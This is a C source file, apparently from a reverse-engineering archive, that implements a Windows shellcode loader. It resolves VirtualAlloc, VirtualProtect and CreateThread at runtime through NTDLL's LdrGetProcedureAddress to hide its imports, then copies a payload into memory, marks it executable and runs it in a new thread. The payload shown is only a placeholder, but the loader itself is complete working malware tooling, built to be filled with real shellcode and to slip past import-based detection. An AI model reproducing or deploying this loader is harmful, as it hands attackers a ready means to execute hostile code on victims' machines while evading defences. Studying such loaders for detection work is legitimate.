/*
    Shellcode Loader
    Archive of Reversing.ID

    Resolve function using NTDLL's internal LdrGetProcedureAddress.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - access:       LdrGetProcedureAddress
    - allocation:   VirtualAlloc
    - writing:      RtlMoveMemory
    - permission:   VirtualProtect
    - execution:    CreateThread
*/

#include <windows.h>
#include <stdint.h>

/* ========= structure definitions ========= */
typedef struct _ANSI_STRING {
    USHORT  Length;
    USHORT  MaximumLength;
    PCHAR   Buffer;
} ANSI_STRING, *PANSI_STRING;

/* ========= function signatures ========= */
typedef NTSTATUS NTAPI LdrGetProcedureAddress_t(HMODULE, PANSI_STRING, WORD, PVOID *);

typedef LPVOID WINAPI VirtualAlloc_t(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   WINAPI VirtualProtect_t(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL   WINAPI VirtualFree_t(LPVOID, SIZE_T, DWORD);
typedef HANDLE WINAPI CreateThread_t(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  WINAPI WaitForSingleObject_t(HANDLE, DWORD);

typedef LdrGetProcedureAddress_t FAR * pLdrGetProcedureAddress;
typedef VirtualAlloc_t           FAR * pVirtualAlloc;
typedef VirtualProtect_t         FAR * pVirtualProtect;
typedef VirtualFree_t            FAR * pVirtualFree;
typedef CreateThread_t           FAR * pCreateThread;
typedef WaitForSingleObject_t    FAR * pWaitForSingleObject;


static void ansi_init (ANSI_STRING *s, PCHAR name)
{
    s->Buffer        = name;
    s->Length        = (USHORT) lstrlenA (name);
    s->MaximumLength = s->Length + 1;
}


int main ()
{
    void *  runtime     = NULL;
    BOOL    retval;
    HANDLE  h_thread;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    ANSI_STRING fn_name;
    HMODULE     ntdll;
    HMODULE     kernel32;

    pLdrGetProcedureAddress LdrGetProcedureAddress;

    // function pointers resolved at runtime
    pVirtualAlloc           fn_VirtualAlloc;
    pVirtualProtect         fn_VirtualProtect;
    pVirtualFree            fn_VirtualFree;
    pCreateThread           fn_CreateThread;
    pWaitForSingleObject    fn_WaitForSingleObject;

    // bootstrap: get LdrGetProcedureAddress from ntdll
    ntdll                  = GetModuleHandleA ("ntdll.dll");
    LdrGetProcedureAddress = (pLdrGetProcedureAddress) GetProcAddress (ntdll, "LdrGetProcedureAddress");

    // resolve all target functions via LdrGetProcedureAddress
    kernel32 = GetModuleHandleA ("kernel32.dll");

    ansi_init (&fn_name, "VirtualAlloc");
    LdrGetProcedureAddress (kernel32, &fn_name, 0, (PVOID *) &fn_VirtualAlloc);

    ansi_init (&fn_name, "VirtualProtect");
    LdrGetProcedureAddress (kernel32, &fn_name, 0, (PVOID *) &fn_VirtualProtect);

    ansi_init (&fn_name, "VirtualFree");
    LdrGetProcedureAddress (kernel32, &fn_name, 0, (PVOID *) &fn_VirtualFree);

    ansi_init (&fn_name, "CreateThread");
    LdrGetProcedureAddress (kernel32, &fn_name, 0, (PVOID *) &fn_CreateThread);

    ansi_init (&fn_name, "WaitForSingleObject");
    LdrGetProcedureAddress (kernel32, &fn_name, 0, (PVOID *) &fn_WaitForSingleObject);

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = fn_VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval = fn_VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        h_thread = fn_CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        fn_WaitForSingleObject (h_thread, -1);
    }

    // deallocate the space
    fn_VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}
